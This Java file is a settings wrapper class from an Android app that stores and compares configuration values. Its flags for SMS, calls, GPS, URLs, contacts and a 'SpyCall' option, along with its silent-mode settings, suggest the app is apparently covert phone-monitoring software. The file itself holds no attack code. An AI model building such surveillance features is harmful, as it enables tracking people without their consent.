package iits.code.bus;

import android.content.Context;
import iits.code.dao.Setting_DAO;
import iits.code.dto.Setting_DTO;

public class Setting_BUS {
    public static void createTable(Context context) {
        Setting_DAO.createTable(context);
    }

    public static long insert(Context context, Setting_DTO system) {
        return Setting_DAO.insert(context, system);
    }

    public static boolean deleteAlls(Context context) {
        return Setting_DAO.deleteAlls(context);
    }

    public static Setting_DTO get(Context context) {
        return Setting_DAO.get(context);
    }

    public static boolean update(Context context, Setting_DTO system) {
        return Setting_DAO.update(context, system);
    }

    public static String getLink(Context context) {
        return Setting_DAO.getLink(context);
    }

    public static boolean getRunMode(Context context) {
        return Setting_DAO.getRunMode(context);
    }

    public static boolean setLink(Context context, String link) {
        return Setting_DAO.setLink(context, link);
    }

    public static boolean setSilent(Context context, int value) {
        return Setting_DAO.setSilent(context, value);
    }

    public static int getSilent(Context context) {
        return Setting_DAO.getSilent(context);
    }

    public static boolean setVibrate(Context context, int value) {
        return Setting_DAO.setVibrate(context, value);
    }

    public static int getVibrate(Context context) {
        return Setting_DAO.getVibrate(context);
    }

    public static boolean compare(Setting_DTO system1, Setting_DTO system2) {
        if (system1 == null || system2 == null) {
            return false;
        }
        if (!system1.getSecretKey().equals(system2.getSecretKey())) {
            return false;
        }
        if (system1.getReportTime() != system2.getReportTime()) {
            return false;
        }
        if (system1.getVertical() != system2.getVertical()) {
            return false;
        }
        if (system1.getHorizontal() != system2.getHorizontal()) {
            return false;
        }
        if (system1.getGPSInterval() != system2.getGPSInterval()) {
            return false;
        }
        if (system1.getFlagSMS() != system2.getFlagSMS()) {
            return false;
        }
        if (system1.getFlagCall() != system2.getFlagCall()) {
            return false;
        }
        if (system1.getFlagGPS() != system2.getFlagGPS()) {
            return false;
        }
        if (system1.getFlagURL() != system2.getFlagURL()) {
            return false;
        }
        if (system1.getFlagSpyCall() != system2.getFlagSpyCall()) {
            return false;
        }
        if (system1.getFlagContact() != system2.getFlagContact()) {
            return false;
        }
        if (system1.getRunMode() != system2.getRunMode()) {
            return false;
        }
        return true;
    }
}
